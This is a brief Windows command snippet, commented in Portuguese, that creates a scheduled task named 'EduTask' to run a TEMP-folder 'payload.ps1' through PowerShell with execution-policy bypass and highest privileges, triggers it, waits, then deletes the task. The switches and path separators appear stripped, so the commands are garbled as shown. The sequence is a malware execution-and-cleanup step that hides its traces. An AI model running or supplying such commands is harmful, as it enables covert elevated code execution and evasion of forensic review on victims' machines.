# Criar tarefa agendada para o PS1 principal
schtasks Create TN EduTask TR powershell -Exec Bypass -File $envTEMPpayload.ps1 SC ONCE ST 0000 RL HIGHEST F
schtasks Run TN EduTask
Start-Sleep -Seconds 15
schtasks Delete TN EduTask F